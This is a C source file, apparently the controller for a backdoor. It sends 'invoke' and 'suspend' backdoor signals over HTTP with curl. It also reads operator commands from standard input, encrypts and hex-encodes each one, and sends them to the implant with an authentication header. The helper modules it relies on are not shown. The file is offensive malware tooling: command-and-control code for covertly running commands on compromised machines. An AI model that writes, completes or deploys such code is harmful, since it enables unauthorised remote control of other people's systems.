#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/types.h>
#include <curl/curl.h>

#include "config.h"
#include "constants.h"
#include "logger.h"
#include "crypto.h"
#include "network.h"
#include "message.h"

static char *line = NULL;
static int message_id = 0;

static void toggle_backdoor(int message_id, int command_type)
{
  unsigned char message[BUF_SIZE], buf[BUF_SIZE];

  generate_rand_string(buf, 24);
  craft_message(message, AUTH_HEADER, message_id, command_type, buf, 24);
  send_request(message);
}

static void cleanup()
{
  free(line);
  toggle_backdoor(message_id, TYPE_SUSPEND_BACKDOOR);
  curl_global_cleanup();
  exit(EXIT_SUCCESS);
}

int main()
{
  ssize_t n;
  size_t len = 0;
  int ciphertext_len, command_type;
  unsigned char ciphertext_hex[DATA_BUF_SIZE], ciphertext[DATA_BUF_SIZE], message[DATA_BUF_SIZE];
  curl_global_init(CURL_GLOBAL_DEFAULT);

  signal(SIGINT, cleanup);

  toggle_backdoor(message_id, TYPE_INVOKE_BACKDOOR);
  message_id++;
  while ((n = getline(&line, &len, stdin)) != -1)
  {
    // remove newline
    line[n - 1] = 0;
    if ((ciphertext_len = encrypt((unsigned char *)line, len, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH, ciphertext)) < 0)
    {
      log_error("encrypt");
      continue;
    }

    to_hex(ciphertext, ciphertext_len, ciphertext_hex);
    command_type = get_command_type(line);
    if (craft_message(message, AUTH_HEADER, message_id, command_type, ciphertext_hex, ciphertext_len) < 0)
    {
      log_error("craft_message");
      continue;
    }

    send_request(message);
    message_id++;
  }

  cleanup();

  return 0;
}